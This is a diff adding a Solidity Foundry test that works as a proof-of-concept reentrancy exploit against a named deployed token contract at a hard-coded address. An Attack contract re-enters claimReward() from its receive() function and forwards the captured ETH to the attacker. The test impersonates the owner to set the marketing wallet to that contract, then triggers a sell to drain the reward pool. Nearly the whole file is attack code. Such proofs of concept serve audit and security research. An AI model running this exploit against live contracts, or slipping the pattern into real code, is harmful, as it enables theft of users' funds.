@@ -1,0 +1,95 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface IMetaverseKombat {
+    function owner() external view returns (address);
+    function pancakePair() external view returns (address);
+    function pancakeRouter() external view returns (address);
+    function marketingwallet() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function claimReward() external;
+    function update_MarketingWalletAddress(address) external;
+    function setSwapAndLiquifyEnabled(bool, uint256) external;
+    function _rewardPool() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function getCurrentTimeStamp() external view returns (uint256);
+    function UserrewardPoolOnLastClaim(address) external view returns (uint256);
+}
+
+contract Attack {
+    IMetaverseKombat public token;
+    address payable public attacker;
+
+    constructor(address _token) {
+        token = IMetaverseKombat(_token);
+        attacker = payable(msg.sender);
+    }
+
+    receive() external payable {
+        // Re-entrancy: claim reward immediately
+        token.claimReward();
+        // Forward any ETH received to the original attacker
+        (bool sent, ) = attacker.call{value: address(this).balance}("");
+        require(sent, "forward failed");
+    }
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
+    IMetaverseKombat token = IMetaverseKombat(TOKEN);
+
+    address owner;
+    address pancakePair;
+    address attacker;
+
+    function setUp() public {
+        attacker = makeAddr("attacker");
+        vm.label(TOKEN, "MetaVerseKombat");
+        vm.label(attacker, "attacker");
+
+        owner = token.owner();
+        pancakePair = token.pancakePair();
+
+        // Label important addresses
+        vm.label(owner, "owner");
+        vm.label(pancakePair, "pancakePair");
+    }
+
+    function testReentrancyExploit() public {
+        // Deploy malicious marketing wallet
+        Attack attack = new Attack(TOKEN);
+        vm.label(address(attack), "attackContract");
+
+        // Phase 1: Setup by owner
+        vm.startPrank(owner);
+        // Change marketing wallet to our attack contract
+        token.update_MarketingWalletAddress(address(attack));
+        // Enable swap & liquify with zero minimum
+        token.setSwapAndLiquifyEnabled(true, 0);
+        // Transfer some tokens to the attack contract so it can claim rewards
+        token.transfer(address(attack), 100e18);
+        // Transfer tokens to the attacker EOA for selling
+        token.transfer(attacker, 1000e18);
+        vm.stopPrank();
+
+        // Verify setup
+        assertEq(token.marketingwallet(), address(attack), "marketing wallet should be attack");
+        assertTrue(token.balanceOf(attacker) >= 1000e18, "attacker should have tokens");
+
+        // Record attacker ETH balance before exploit
+        uint256 ethBefore = attacker.balance;
+
+        // Phase 2: Attacker triggers a sell that will cause swapAndLiquify and reentrancy
+        vm.prank(attacker);
+        token.transfer(pancakePair, 1000e18);
+
+        // After the transaction, attacker should have gained ETH from the reward pool
+        uint256 ethAfter = attacker.balance;
+        assertGt(ethAfter, ethBefore, "Attacker should profit from reentrancy");
+    }
+}
+```
